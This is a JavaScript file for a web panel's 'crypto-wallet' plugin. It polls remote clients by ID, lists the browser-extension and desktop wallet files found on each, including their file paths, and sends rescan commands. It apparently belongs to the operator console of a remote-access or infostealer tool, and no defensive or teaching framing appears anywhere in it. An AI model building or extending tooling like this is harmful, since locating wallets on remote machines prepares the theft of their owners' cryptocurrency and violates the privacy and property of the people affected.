const params = new URLSearchParams(window.location.search);
const clientIdInput = document.getElementById("client-id");
const rescanBtn = document.getElementById("rescan-btn");
const walletList = document.getElementById("wallet-list");
const walletCount = document.getElementById("wallet-count");
const logEl = document.getElementById("log");

const pluginId = "crypto-wallet";
const clientId = params.get("clientId") || "";
clientIdInput.value = clientId;

let pollTimer = null;

function log(line) {
  const ts = new Date().toISOString();
  logEl.textContent = `${ts} ${line}\n` + logEl.textContent;
}

function walletIcon(type) {
  return type === "extension" ? "🧩" : "💾";
}

function renderWallets(wallets) {
  walletCount.textContent = wallets.length;
  if (wallets.length > 0) {
    walletCount.classList.add("has-wallets");
  } else {
    walletCount.classList.remove("has-wallets");
  }

  if (wallets.length === 0) {
    walletList.innerHTML = '<p class="empty-msg">No crypto wallets detected on this client.</p>';
    return;
  }

  walletList.innerHTML = wallets.map((w) => {
    const meta = w.browser ? `${w.browser} extension` : "Desktop wallet file";
    return `
      <div class="wallet-item type-${w.type}">
        <span class="wallet-icon">${walletIcon(w.type)}</span>
        <div class="wallet-info">
          <div class="wallet-name">${escapeHtml(w.name)}</div>
          <div class="wallet-meta">${escapeHtml(meta)}</div>
          ${w.path ? `<div class="wallet-path" title="${escapeHtml(w.path)}">${escapeHtml(w.path)}</div>` : ""}
        </div>
        <span class="type-badge ${w.type}">${w.type === "extension" ? "Browser Ext" : "File"}</span>
      </div>
    `;
  }).join("");
}

function escapeHtml(str) {
  const d = document.createElement("div");
  d.textContent = str;
  return d.innerHTML;
}

async function sendEvent(event, payload) {
  const id = clientIdInput.value.trim();
  if (!id) {
    log("Missing clientId");
    return;
  }
  const res = await fetch(`/api/clients/${encodeURIComponent(id)}/plugins/${pluginId}/event`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event, payload }),
  });
  if (!res.ok) {
    log(`Send failed: ${res.status}`);
    return;
  }
  log(`Sent event: ${event}`);
}

async function pollEvents() {
  const id = clientIdInput.value.trim();
  if (!id) return;

  try {
    const res = await fetch(`/api/clients/${encodeURIComponent(id)}/plugins/${pluginId}/events`);
    if (!res.ok) return;
    const events = await res.json();
    for (const ev of events) {
      if (ev.event === "wallets_detected") {
        const wallets = ev.payload?.wallets ?? [];
        log(`Received wallets_detected: ${wallets.length} wallet(s) found`);
        renderWallets(wallets);
      } else {
        log(`Event: ${ev.event}`);
      }
    }
  } catch (err) {
    // ignore poll errors
  }
}

function startPolling() {
  if (pollTimer) clearInterval(pollTimer);
  pollTimer = setInterval(pollEvents, 2000);
  pollEvents();
}

rescanBtn.addEventListener("click", () => {
  log("Requesting rescan...");
  sendEvent("rescan", null);
});

clientIdInput.addEventListener("change", () => {
  startPolling();
});

if (clientId) {
  startPolling();
}
